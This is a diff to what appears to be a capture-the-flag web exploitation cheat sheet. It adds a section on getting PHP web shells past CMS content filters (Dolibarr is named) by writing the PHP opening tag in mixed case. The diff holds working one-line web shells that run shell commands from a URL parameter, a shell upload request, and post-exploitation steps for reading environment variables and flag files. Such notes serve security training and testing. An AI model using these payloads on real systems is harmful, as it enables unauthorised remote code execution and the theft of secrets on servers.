@@ -84,6 +84,15 @@ curl http://target/upload/shell.jpg.php
 ```
 **Usage**: `shell.php?0=id`
 
+### PHP Tag Case-Sensitivity Bypass (CMS content editors)
+When a CMS/ERP filters `<?php` in page content (e.g., Dolibarr website module), try mixed-case variants:
+```php
+<?pHp system($_GET['cmd']); ?>
+<?PHP system($_GET['cmd']); ?>
+<?Php system($_GET['cmd']); ?>
+```
+PHP's parser is case-insensitive for the opening tag. Many content filters use exact lowercase string matching. Also try: `multipart/form-data` encoding if `application/x-www-form-urlencoded` fails silently.
+
 ### Post-RCE Extraction Order
 1. **Environment variables**: `shell.php?cmd=printenv` or `<?php phpinfo(); ?>` — secrets/flags commonly stored as env vars
 2. **Common flag paths**: `shell.php?cmd=cat /flag /flag.txt /app/flag.txt /var/www/html/flag* 2>/dev/null`
